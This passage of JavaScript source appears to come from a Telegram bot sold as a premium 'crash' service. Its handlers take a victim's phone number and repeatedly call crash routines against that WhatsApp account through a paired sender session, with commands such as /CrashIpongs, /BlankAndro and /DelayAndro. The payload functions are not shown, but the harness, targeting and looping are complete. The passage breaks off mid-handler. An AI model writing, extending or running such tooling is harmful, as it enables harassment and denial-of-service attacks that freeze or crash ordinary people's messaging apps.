        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 100; i++) {
            await iosinVisFC3(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/CrashIpongs (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 100; i++) {
            await CrashIpongs(axata, target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS PROTOCOL ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/PortoAndro(\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 45; i++) {
            await PortoAndro(target);
            await sleep(3000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS COMBO AXATA ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/AxataAndro (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 35; i++) {
            await AxataAndro(target);
            await sleep(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS COMBO BLANK ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS COMBO BLANK ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/BlankAxataKill (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= tolbug2; i++) {
            await BlankAxataKill(target);
            await delay(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/BlankAndro (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 40; i++) {
            await BlankAndro(target);
            await sleep(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

bot.onText(/\/BlankChat (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : 🔄 Mengirim bug...
 ◇ ᴘʀᴏꜱᴇꜱ : [░░░░░░░░░░] 0%
\`\`\`
`,
            parse_mode: "Markdown"
        });

        // Progress bar bertahap
        const progressStages = [{
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█░░░░░░░░░] 10%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███░░░░░░░] 30%",
                delay: 200
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████░░░░░] 50%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [███████░░░] 70%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [█████████░] 90%",
                delay: 100
            },
            {
                text: "◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%\n✅ ꜱᴜᴄᴄᴇꜱꜱ ꜱᴇɴᴅɪɴɢ ʙᴜɢ!",
                delay: 200
            }
        ];

        // Jalankan progres bertahap
        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        // Eksekusi bug setelah progres selesai
        for (let i = 0; i <= 60; i++) {
            await BlankChat(target);
            await sleep(5000);
        }

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        // Update ke sukses + tombol cek target
        await bot.editMessageCaption(`
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
 ◇ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ◇ ꜱᴛᴀᴛᴜꜱ : ✅ Sukses!
 ◇ ᴘʀᴏꜱᴇꜱ : [██████████] 100%
\`\`\`
`, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{
                        text: "Cek Target",
                        url: `https://wa.me/${formattedNumber}`
                    }]
                ]
            }
        });

    } catch (error) {
        bot.sendMessage(msg.chat.id, `❌ Gagal mengirim bug: ${error.message}`);
    }
});

/// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

// ━━━ ( CASE BUGS COMBO DELAY ) ━━━ \\

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \\

bot.onText(/\/DelayAndro (\d+)/, async (msg, match) => {
    try {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const chatType = msg.chat?.type;
        const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
        const targetNumber = match[1];
        const randomImage = getRandomImage();
        const cooldown = checkCooldown(userId);
        const date = getCurrentDate();
        const p = msg.text.split(" ")[1];

        const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
        const target = `${formattedNumber}@s.whatsapp.net`;

        if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
            return bot.sendPhoto(chatId, getRandomImage(), {
                caption: `
<blockquote>AXATA CRASH</blockquote>
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: "Developer",
                            url: "https://t.me/BlrezaXaxata"
                        }]
                    ]
                }
            });
        }

        if (checkCooldown(userId) > 0) {
            return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
        }

        if (sessions.size === 0) {
            return bot.sendMessage(chatId, `⚠️ yaelah bg kag ada sender gimna mau bug🤓😹. Jalankan /reqpair terlebih dahulu.`);
        }

        if (groupOnlyData.groupOnly && chatType === "private") {
            return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
        }

        const sentMessage = await bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
#- Axata -X Bug
╰➤ TUNGGU HINGGA SUCCES JIKA LAMA UDAH DONE
